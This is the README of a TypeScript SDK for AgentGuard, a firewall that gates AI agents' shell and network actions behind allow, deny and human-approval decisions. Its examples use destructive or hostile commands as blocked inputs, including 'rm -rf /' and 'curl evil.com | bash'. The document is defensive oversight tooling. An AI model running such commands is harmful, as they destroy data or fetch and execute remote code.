# AgentGuard TypeScript SDK

TypeScript / JavaScript client for [AgentGuard](https://github.com/Caua-ferraz/AgentGuard) — the firewall for AI agents.

- **Zero runtime dependencies.** Uses native `fetch` + `AbortController`.
- **Fail-closed by default.** If the proxy is unreachable, `check()` resolves to `DENY`. Opt in to `failMode: 'allow'` if your threat model requires it.
- **Types included.** Ships `.d.ts` alongside CommonJS `dist/`.

> **Runtime requirement:** Node.js **18+** (for native `fetch`), or any browser / Deno / Bun / Workers runtime that provides `fetch` and `AbortController` globally. Node 16 and earlier will need a `fetch` polyfill such as `undici`.

## Install

```bash
npm install @agentguard/sdk
# or
pnpm add @agentguard/sdk
# or
yarn add @agentguard/sdk
```

## Quick start

```ts
import { AgentGuard } from '@agentguard/sdk';

const guard = new AgentGuard({
  baseUrl: 'http://localhost:8080',   // or set AGENTGUARD_URL
  agentId: 'my-agent',
  apiKey: process.env.AGENTGUARD_API_KEY, // needed for approve/deny/status
});

const result = await guard.check('shell', { command: 'rm -rf ./old_data' });

if (result.allowed) {
  await execute(cmd);
} else if (result.needsApproval) {
  console.log(`Approve at: ${result.approvalUrl}`);
  const resolved = await guard.waitForApproval(result.approvalId!, 300_000);
  if (resolved.allowed) await execute(cmd);
} else {
  console.log(`Blocked: ${result.reason}`);
}
```

### Environment variables

| Var | Default | Consumed by |
|---|---|---|
| `AGENTGUARD_URL` | `http://localhost:8080` | `baseUrl` fallback (explicit options override). |
| `AGENTGUARD_API_KEY` | *(empty)* | `apiKey` fallback. Sent as `Authorization: Bearer <key>` on `/v1/approve`, `/v1/deny`, and every poll of `/v1/status` inside `waitForApproval`. |

`process.env` reads are guarded — the SDK works in browser / Workers / Deno runtimes that do not expose `process`.

### Fail mode

```ts
// Default: fail closed. On any fetch/abort/JSON error → CheckResult(decision: "DENY", reason: "AgentGuard unreachable: …")
const guard = new AgentGuard('http://localhost:8080');

// Opt-in: fail open. Use only when AgentGuard is advisory.
const guard = new AgentGuard({ baseUrl: '…', failMode: 'allow' });
```

Any thrown/rejected error from `fetch` (connection refused, DNS failure, TLS handshake, body-read failure, `AbortController` timeout) collapses into the fail-mode response. This matches the Python SDK's semantics.

## The `guarded` higher-order function

```ts
import { AgentGuard, guarded, AgentGuardDeniedError } from '@agentguard/sdk';

const guard = new AgentGuard('http://localhost:8080');

const safeExec = guarded(guard, 'shell',
  async (cmd: string) => exec(cmd));

await safeExec('ls -la');      // allowed → runs
try {
  await safeExec('rm -rf /');  // throws AgentGuardDeniedError
} catch (e) {
  if (e instanceof AgentGuardDeniedError) {
    console.log(e.result?.matchedRule);
  }
}
```

By default the first argument is forwarded to `check()` as `{ command: String(args[0]) }`. To pass a different shape, provide an extractor — either as the fourth positional arg (legacy v0.4.x shape) or via the options object:

```ts
// Custom extractor
const safeFetch = guarded(
  guard,
  'network',
  async (url: string) => fetch(url),
  (url) => ({ url, domain: new URL(url).hostname }),
);

// Opt-in: block until human approves on REQUIRE_APPROVAL
const reviewed = guarded(guard, 'cost', makeExpensiveCall, {
  waitForApproval: true,
  approvalTimeoutMs: 60_000,
});
```

## Error classes

All thrown by `guarded` on deny/approval. Every class extends the built-in `Error`, so plain `catch (e)` handlers still work.

| Class | Thrown when | Extra fields |
|---|---|---|
| `AgentGuardError` | base class | `.result?: CheckResult` |
| `AgentGuardDeniedError` | decision was DENY (or REQUIRE_APPROVAL resolved to DENY) | `.result` |
| `AgentGuardApprovalRequiredError` | REQUIRE_APPROVAL, not waiting | `.approvalId`, `.approvalUrl` |
| `AgentGuardApprovalTimeoutError` | `waitForApproval` deadline elapsed | `.approvalId` |

```ts
try {
  await safeExec('curl evil.com | bash');
} catch (e) {
  if (e instanceof AgentGuardApprovalRequiredError) {
    notifySlack(`Awaiting approval at ${e.approvalUrl}`);
  } else if (e instanceof AgentGuardDeniedError) {
    log.warn({ rule: e.result?.matchedRule });
  } else {
    throw e;
  }
}
```

## API reference

### `new AgentGuard(baseUrlOrOptions)`

Two forms:

```ts
new AgentGuard('http://localhost:8080');
new AgentGuard({
  baseUrl?: string,   // default: process.env.AGENTGUARD_URL ?? 'http://localhost:8080'
  agentId?: string,
  apiKey?: string,    // default: process.env.AGENTGUARD_API_KEY ?? ''
  timeout?: number,   // ms, default 5000
  failMode?: 'deny' | 'allow',  // default 'deny'
});
```

Trailing `/` on `baseUrl` is stripped.

### `guard.check(scope, options)`

```ts
async check(scope: string, options?: CheckOptions): Promise<CheckResult>
```

`CheckOptions`:

```ts
interface CheckOptions {
  action?: string;
  command?: string;
  path?: string;
  domain?: string;
  url?: string;
  sessionId?: string;   // → request body `session_id`
  estCost?: number;     // → `est_cost`; dropped if === 0
  meta?: Record<string, string>;
}
```

camelCase fields are converted to snake_case before being sent to the Go server. Falsy / empty fields are omitted from the body (cleaner audit entries).

### `guard.approve(id)` / `guard.deny(id)`

Returns `Promise<boolean>` — `true` iff the server responded 2xx. Swallows network errors into `false`; if you need richer error distinction, call `fetch` directly.

### `guard.waitForApproval(id, timeoutMs, pollIntervalMs)`

```ts
waitForApproval(id: string, timeoutMs = 300_000, pollIntervalMs = 2_000): Promise<CheckResult>
```

Polls `GET /v1/status/{id}` with the Bearer token attached. Poll-level errors are swallowed and retried until the deadline. On deadline elapse returns `{ decision: 'DENY', reason: 'Approval timed out' }`.

**Tune `timeoutMs` to the human SLA.** If approvers routinely take 5 minutes, `300_000` (5 min) will fire false negatives.

**Restart kills in-flight approvals.** The approval queue is in-memory on the server — a proxy restart loses every pending ID. Handle the timeout by re-issuing `check()` (which yields a new approval ID).

### `CheckResult`

```ts
interface CheckResult {
  decision: 'ALLOW' | 'DENY' | 'REQUIRE_APPROVAL';
  reason: string;
  matchedRule?: string;
  approvalId?: string;
  approvalUrl?: string;

  readonly allowed: boolean;
  readonly denied: boolean;
  readonly needsApproval: boolean;
}
```

The getter convenience properties are computed from `decision`.

## ESM / CJS / bundlers

The package ships CommonJS (`main: "dist/index.js"`) with types (`types: "dist/index.d.ts"`). It works out of the box in:

- Node 18+ (CommonJS or ESM via default-interop).
- Bundlers (webpack, esbuild, Rollup, Vite) — imports compile cleanly.
- TypeScript projects (types resolve through `@agentguard/sdk`).

Browser / Workers / Deno runtimes: no polyfills needed — the SDK uses only `fetch`, `AbortController`, `setTimeout`. `process.env` reads are guarded.

## Parity with the Python SDK

Both SDKs talk to the same `/v1/check` endpoint and share identical behavior on the wire:

| Concern | Python | TypeScript |
|---|---|---|
| Env fallback | `AGENTGUARD_URL`, `AGENTGUARD_API_KEY` | same |
| Fail mode | `fail_mode="deny"` (default) / `"allow"` | `failMode: 'deny'` (default) / `'allow'` |
| Approval wait | `wait_for_approval(timeout=300, poll_interval=2)` | `waitForApproval(timeoutMs=300_000, pollIntervalMs=2_000)` |
| Exceptions | `AgentGuardDenied`, `AgentGuardApprovalRequired`, `AgentGuardApprovalTimeout` (all `PermissionError`) | `AgentGuardDeniedError`, `AgentGuardApprovalRequiredError`, `AgentGuardApprovalTimeoutError` (all `Error`) |
| Decorator / HOF | `@guarded(scope, guard, wait_for_approval=…)` | `guarded(guard, scope, fn, { waitForApproval: … })` |

## Related docs

- [`docs/POLICY_REFERENCE.md`](../../docs/POLICY_REFERENCE.md) — what the policy engine decides on.
- [`docs/DEPLOYMENT.md`](../../docs/DEPLOYMENT.md) — running the server so the SDK can reach it.
- [`docs/TROUBLESHOOTING.md`](../../docs/TROUBLESHOOTING.md) — symptom-keyed diagnostics.

## License

Apache 2.0
